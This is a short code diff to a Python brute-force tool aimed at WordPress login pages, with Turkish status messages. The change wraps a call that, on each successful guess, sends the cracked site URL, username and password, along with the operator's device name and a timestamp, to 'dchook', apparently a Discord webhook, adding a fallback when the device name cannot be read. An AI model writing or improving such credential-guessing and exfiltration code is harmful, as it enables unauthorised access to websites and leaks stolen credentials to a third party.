@@ -54,7 +54,10 @@ def brute(url, username, password):
         if('redirect_to' in response.url):
             return False
         colorprint.resultprint(f'{url}/wp-login.php {username}:{password} Giriş Başarılı!')
-        dchook(f"{url}/wp-login.php {username}:{password} cihaz:{os.getlogin()} zaman:{datetime.datetime.now()} - Enistein")
+        try:
+            dchook(f"{url}/wp-login.php {username}:{password} cihaz:{os.getlogin()} zaman:{datetime.datetime.now()} - Enistein")
+        except:
+            dchook(f"{url}/wp-login.php {username}:{password} cihaz:cihaz bilgisi alınamadı zaman:{datetime.datetime.now()} - Enistein")
         save(f'{url}/wp-login.php {username}:{password} Giriş Başarılı!')
         return True
     else:
